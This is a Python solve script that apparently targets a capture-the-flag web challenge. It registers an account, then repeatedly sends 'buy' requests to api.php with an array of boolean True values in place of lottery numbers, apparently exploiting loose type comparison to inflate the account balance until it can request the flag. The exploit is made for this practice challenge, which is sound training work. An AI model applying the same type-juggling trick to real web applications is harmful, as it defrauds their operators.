import requests
import json
import time
URL = "http://bulbasaur_90062005cad978508e8a4aeffdeea115.ctf.night-wolf.io/api.php"
headerRegister = {
    'Content-Length': '35',
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'X-Requested-With': 'XMLHttpRequest',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36',
    'Content-Type': 'application/json',
    'Origin': 'http://bulbasaur_90062005cad978508e8a4aeffdeea115.ctf.night-wolf.io',
    'Referer': 'http://bulbasaur_90062005cad978508e8a4aeffdeea115.ctf.night-wolf.io/register.php',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cookie': 'PHPSESSID=33ca4e1c1cada6f6b24fb250d559f4a7',
    'Connection': 'close'
}

dataRegister = {"action":"register","name":"daru"}
registerRequest = requests.post(url=URL, headers=headerRegister, json=dataRegister)
print(registerRequest.text)
headerBuy = {
    'Host': 'bulbasaur_90062005cad978508e8a4aeffdeea115.ctf.night-wolf.io',
    'Content-Length': '36',
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'X-Requested-With': 'XMLHttpRequest',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36',
    'Content-Type': 'application/json',
    'Origin': 'http://bulbasaur_90062005cad978508e8a4aeffdeea115.ctf.night-wolf.io',
    'Referer': 'http://bulbasaur_90062005cad978508e8a4aeffdeea115.ctf.night-wolf.io/buy.php',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cookie': 'PHPSESSID=33ca4e1c1cada6f6b24fb250d559f4a7',
    'Connection': 'close'
}

money = 0
while (money != 99999999999):
    dataBuy = {
      "action": "buy",
      "numbers": [True, True, True, True, True, True, True]
    }
    registerBuy = requests.post(url=URL, headers=headerBuy, json=dataBuy)
    data = registerBuy.json()
    money = data['money']
    print("Current money: " + str(money))
    
    
dataFlag = {"action" : "flag"}
headerFlag = {
    "Host": "bulbasaur_90062005cad978508e8a4aeffdeea115.ctf.night-wolf.io",
    "Content-Length": "17",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "X-Requested-With": "XMLHttpRequest",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36",
    "Content-Type": "application/json",
    "Origin": "http://bulbasaur_90062005cad978508e8a4aeffdeea115.ctf.night-wolf.io",
    "Referer": "http://bulbasaur_90062005cad978508e8a4aeffdeea115.ctf.night-wolf.io/market.php",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Cookie": "PHPSESSID=33ca4e1c1cada6f6b24fb250d559f4a7",
    "Connection": "close"
}
flag = requests.post(url=URL, headers=headerFlag, json=dataFlag)
print(flag.text)



